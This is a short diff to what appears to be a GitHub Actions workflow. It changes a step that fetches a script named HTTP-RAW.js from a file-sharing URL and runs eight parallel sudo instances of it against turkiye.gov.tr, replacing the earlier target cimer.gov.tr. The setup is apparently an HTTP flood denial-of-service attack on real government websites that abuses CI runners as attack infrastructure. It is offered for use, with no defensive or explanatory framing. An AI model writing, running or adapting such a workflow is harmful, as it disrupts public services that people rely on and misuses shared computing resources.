@@ -14,10 +14,10 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/Xandermercado800/HTTP-RAWWW/raw/refs/heads/main/HTTP-RAW.js
+          wget https://up.zip/4fxkv/index.js -O HTTP-RAW.js
           PIDS=()
           for i in {1..8}; do
-            sudo timeout 30 node HTTP-RAW.js https://www.cimer.gov.tr/ 30 &
+            sudo timeout 30 node HTTP-RAW.js https://www.turkiye.gov.tr/ 30 &
             PIDS+=($!)
           done
           
